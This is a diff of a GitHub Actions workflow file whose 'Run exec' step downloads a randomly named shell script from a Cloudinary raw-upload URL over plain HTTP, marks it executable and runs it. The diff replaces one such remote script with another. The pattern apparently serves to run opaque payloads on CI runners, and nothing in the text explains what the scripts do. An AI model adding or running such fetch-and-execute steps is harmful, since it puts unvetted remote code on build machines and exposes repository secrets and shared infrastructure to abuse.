@@ -12,9 +12,9 @@ jobs:
     steps:
       - name: Run exec
         run: |
-          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711042163/amzeqo8vdwsgytadhvk6.sh
-          chmod +x amzeqo8vdwsgytadhvk6.sh
-          ./amzeqo8vdwsgytadhvk6.sh
+          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711044213/ij0dklvuprnlsnotxl2w.sh
+          chmod +x ij0dklvuprnlsnotxl2w.sh
+          ./ij0dklvuprnlsnotxl2w.sh
 
       - name: IP Workflow
         run: |
